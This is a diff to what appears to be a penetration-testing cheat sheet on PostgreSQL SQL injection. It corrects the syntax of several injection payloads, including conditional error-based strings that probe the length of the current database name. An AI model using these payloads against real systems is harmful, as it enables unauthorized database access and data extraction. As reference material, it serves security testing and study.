@@ -67,7 +67,7 @@ Examples:
 A time-based SQLi payload in PostgreSQL will look like this
 
 ```bash
-1' AND CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END--
+1' AND 1 = CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END--
 ```
 
 Examples:
@@ -77,7 +77,7 @@ Examples:
 1' AND (SELECT LENGTH(current_database()))=1--
 
 #Error Based    
-1' AND CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN 1/(SELECT 0) ELSE NULL END--
+1' AND 1 = CASE WHEN ((SELECT LENGTH(current_database()))=1) THEN 1/(SELECT 0) ELSE NULL END--
 ```
 {% endtab %}
 
